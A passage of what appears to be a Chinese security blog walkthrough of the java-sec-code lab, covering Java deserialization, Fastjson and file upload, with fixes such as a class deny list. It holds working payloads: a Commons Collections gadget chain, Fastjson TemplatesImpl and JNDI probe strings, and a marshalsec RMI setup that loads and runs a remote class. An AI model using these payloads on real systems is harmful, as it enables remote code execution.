ZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR&#x2F;bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo&#x2F;2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEm9wZW4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg&#x3D;</span><br></pre></td></tr></table></figure><p>访问页面</p><p><a href="http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln">http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210926172201962.png" alt="image-20210926172201962"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)</span><br><span class="line">public String rememberMeBlackClassCheck(HttpServletRequest request)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">        return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; catch (InvalidClassException e) &#123;</span><br><span class="line">        logger.info(e.toString());</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;I&#39;m very OK.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复方式是通过Hook resolveClass来校验反序列化的类</p><blockquote><p>序列化数据结构可以了解到包含了类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。这个方法最早是由IBM的研究人员Pierre Ernst在2013年提出《<a href="https://www.ibm.com/developerworks/library/se-lookahead/">Look-ahead Java deserialization</a>》</p></blockquote><p>跟入后对应代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 只允许反序列化SerialObject class</span><br><span class="line"> *</span><br><span class="line"> * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。</span><br><span class="line"> * 类似fastjson通用类的反序列化就不能校验。</span><br><span class="line"> * 但是RASP是通过HOOK java&#x2F;io&#x2F;ObjectInputStream类的resolveClass方法，全局的检测白名单。</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">@Override</span><br><span class="line">protected Class&lt;?&gt; resolveClass(final ObjectStreamClass desc)</span><br><span class="line">        throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String className &#x3D; desc.getName();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject</span><br><span class="line">    logger.info(&quot;Deserialize class name: &quot; + className);</span><br><span class="line"></span><br><span class="line">    String[] denyClasses &#x3D; &#123;&quot;java.net.InetAddress&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.Transformer&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.functors&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    for (String denyClass : denyClasses) &#123;</span><br><span class="line">        if (className.startsWith(denyClass)) &#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return super.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还是不太明白，可以参考：</p><ol><li><a href="https://xz.aliyun.com/t/41/">浅谈Java反序列化漏洞修复方案</a></li><li><a href="http://www.lmxspace.com/2019/11/20/Java反序列化过程深究/">Java反序列化过程深究</a></li></ol><h2 id="8-Fastjson"><a href="#8-Fastjson" class="headerlink" title="8.Fastjson"></a>8.Fastjson</h2><p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p><p>漏洞被利用本质找到一条有效的攻击链，攻击链的末端就是有代码执行能力的类，来达到我们想做的事情，一般都是用来RCE（远程命令执行）。构造一个触发器，也就是通过什么方式来让攻击链执行你想要的代码。触发器可以通过很多方式，比如静态代码块、构造方法等等。</p><p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p><p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；<br>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。<br>攻击者可以构造恶意请求，使目标应用的代码执行流程进入这部分特定setter或getter方法，若上述方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。官方采用了黑名单方式对反序列化类名校验，但随着时间的推移及自动化漏洞挖掘能力的提升。新Gadget会不断涌现，黑名单这种治标不治本的方式只会导致不断被绕过，从而对使用该组件的用户带来不断升级版本的困扰。</p><p>对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法：</p><p>parse (String text)</p><p>parseObject(String text)</p><p>parseObject(String text, Class clazz)</p><p>无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;deserialize&quot;, method &#x3D; &#123;RequestMethod.POST&#125;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String Deserialize(@RequestBody String params) &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果Content-Type不设置application&#x2F;json格式，post数据会被url编码</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 将post提交的string转换为json</span><br><span class="line">            JSONObject ob &#x3D; JSON.parseObject(params);</span><br><span class="line">            return ob.get(&quot;name&quot;).toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Open calc in mac</span><br><span class="line">        String payload &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk&#x2F;OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ&#x3D;&#x3D;\&quot;], \&quot;_name\&quot;: \&quot;lightless\&quot;, \&quot;_tfactory\&quot;: &#123; &#125;, \&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用parseObject 来解析json字符串</p><p>用POST方法打开，Content-Type设置为application/json，暴露使用的fastjson:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164036838.png" alt="image-20210927164036838"></p><h3 id="使用DNSLOG验证"><a href="#使用DNSLOG验证" class="headerlink" title="使用DNSLOG验证"></a>使用DNSLOG验证</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;asText&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164811478.png" alt="image-20210927164811478"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164834250.png" alt="image-20210927164834250"></p><h3 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>编译代码,上传至服务器，我在本地使用Python http.server 进行搭建</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java          &#x2F;&#x2F;进行编译</span><br><span class="line">python3 -m http.server 4444   &#x2F;&#x2F;简单搭建web服务</span><br></pre></td></tr></table></figure><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure><p>在显示监听后，在客户端发送请求payload，主要看创建文件是否成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.169.8.103:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162052579.png" alt="image-20210928162052579"></p><p>发现已经访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;#TouchFile 9999</span><br><span class="line">* Opening JRMP listener on 9999</span><br><span class="line">Have connection from &#x2F;192.168.8.103:54177</span><br><span class="line">Reading message...</span><br><span class="line">Is RMI.lookup call for TouchFile 2</span><br><span class="line">Sending remote classloading stub targeting http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;TouchFile.class</span><br><span class="line">Closing connection</span><br><span class="line"></span><br><span class="line">╰─$ python3 -m http.server 4444</span><br><span class="line">Serving HTTP on :: port 4444 (http:&#x2F;&#x2F;[::]:4444&#x2F;) ...</span><br><span class="line">::ffff:192.168.8.103 - - [28&#x2F;Sep&#x2F;2021 16:06:29] &quot;GET &#x2F;TouchFile.class HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>查看文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162106468.png" alt="image-20210928162106468"></p><ol><li><a href="https://paper.seebug.org/1274/">Fastjson 1.2.24 反序列化漏洞深度分析</a></li><li><a href="https://github.com/alibaba/fastjson/issues/3077">发现最新版本1.2.67依然可以通过dnslog判断正确是否使用fastjson</a></li></ol><h2 id="9-FileUpload"><a href="#9-FileUpload" class="headerlink" title="9.FileUpload"></a>9.FileUpload</h2><p>对于文件上传来说，目前这类漏洞在spring里非常少，原因有两点：</p><ol><li>大多数公司上传的文件都会到cdn</li><li>spring的jsp文件必须在web-inf目录下才能执行</li></ol><p>除非，可以上传war包到tomcat的webapps目录。</p><p>正常上传代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; file.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;status&quot;)</span><br><span class="line">public String uploadStatus() &#123;</span><br><span class="line">    return &quot;uploadStatus&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到没有对后缀名，MIME，文件内容等内容进行校验，可以任意上传。</p><p>对图片上传做限制后的代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&#x2F;picture&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">        if (multifile.isEmpty()) &#123;</span><br><span class="line">            return &quot;Please select a file to upload&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String fileName &#x3D; multifile.getOriginalFilename();</span><br><span class="line">        String Suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F; 获取文件后缀名</span><br><span class="line">        String mimeType &#x3D; multifile.getContentType(); &#x2F;&#x2F; 获取MIME类型</span><br><span class="line">        String filePath &#x3D; UPLOADED_FOLDER + fileName;</span><br><span class="line">        File excelFile &#x3D; convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">        String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">        boolean suffixFlag &#x3D; false;</span><br><span class="line">        for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!suffixFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">        String[] mimeTypeBlackList &#x3D; &#123;</span><br><span class="line">                &quot;text&#x2F;html&quot;,</span><br><span class="line">                &quot;text&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">                &quot;text&#x2F;xml&quot;,</span><br><span class="line">                &quot;application&#x2F;xml&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            &#x2F;&#x2F; 用contains是为了防止text&#x2F;html;charset&#x3D;UTF-8绕过</span><br><span class="line">            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件内容是否是图片 校验3</span><br><span class="line">        boolean isImageFlag &#x3D; isImage(excelFile);</span><br><span class="line">        deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">        if (!isImageFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">         